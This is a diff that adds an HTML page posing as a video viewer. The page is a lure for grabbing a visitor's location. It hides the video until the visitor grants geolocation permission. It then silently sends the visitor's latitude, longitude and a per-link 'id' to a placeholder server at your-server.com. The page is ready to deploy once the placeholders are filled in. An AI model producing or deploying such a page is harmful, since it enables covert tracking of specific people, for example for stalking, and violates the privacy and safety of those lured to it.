@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>View Content - Location Required</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    #video-container {
+      display: none;
+    }
+    #error-message {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <h1>Checking Location Permission...</h1>
+  <div id="error-message"></div>
+
+  <div id="video-container">
+    <h2>Enjoy the Video! 🎬</h2>
+    <video width="320" height="240" controls autoplay loop>
+      <source src="yourvideo.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+  </div>
+
+  <script>
+    function sendLocation(lat, lon) {
+      fetch('https://your-server.com/save-location', {  // <-- Your server API here
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          id: new URLSearchParams(window.location.search).get('id')
+        })
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          // Permission granted
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          sendLocation(latitude, longitude); // Send location to your server
+
+          document.querySelector('h1').style.display = 'none';
+          document.getElementById('video-container').style.display = 'block';
+        },
+        function(error) {
+          // Permission denied
+          document.querySelector('h1').style.display = 'none';
+          document.getElementById('error-message').innerText = "You must allow location permission to view the content.";
+        }
+      );
+    } else {
+      document.querySelector('h1').style.display = 'none';
+      document.getElementById('error-message').innerText = "Geolocation is not supported.";
+    }
+  </script>
+</body>
+</html>
